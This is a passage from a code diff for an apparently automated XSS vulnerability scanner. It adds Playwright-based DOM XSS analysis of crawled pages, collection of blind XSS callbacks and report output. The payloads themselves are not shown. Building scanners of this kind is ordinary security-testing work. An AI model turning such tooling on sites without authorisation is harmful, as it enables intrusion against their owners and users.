+                with sync_playwright() as p:
+                    browser = p.chromium.launch(headless=not args.headed)
+                    context = browser.new_context(ignore_https_errors=True)
+                    page = context.new_page()
+                    
+                    analyzer = DomXssAnalyzer(page)
+                    for url in discovery.crawled_urls:
+                        page.goto(url, wait_until="networkidle")
+                        analyzer.analyze()
+                    
+                    for vuln in analyzer.vulnerabilities:
+                        reporter.add_finding(
+                            url=page.url,
+                            param="DOM",
+                            payload=vuln['payload'],
+                            vuln_type="DOM XSS",
+                            evidence=f"Sink: {vuln['sink']}"
+                        )
+                    
+                    browser.close()
+            except Exception as e:
+                logging.error(f"[DOM Analysis] Error: {e}")
+
+    # Check for any late blind XSS callbacks
+    if args.blind_xss:
+        await asyncio.sleep(60) # Wait a bit for delayed callbacks
+        for unique_id, data in callback_server.found_callbacks.items():
+            reporter.add_finding(
+                url="Unknown (Blind)", 
+                param="Unknown", 
+                payload=unique_id,
+                vuln_type="Blind XSS", 
+                evidence=json.dumps(data, indent=2)
+            )
+    
+    reporter.write()
+    if SARIF_OUTPUT_FILE: 
+        write_sarif()
     agent.save()
-    logging.info(f"└─ Findings saved → {LOGFILE.resolve()}\n")
+    logging.info(f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}\n")
 
 if __name__=="__main__":
-    main()
+    if sys.platform == "win32":
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+        
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logging.info("Scan aborted by user.")
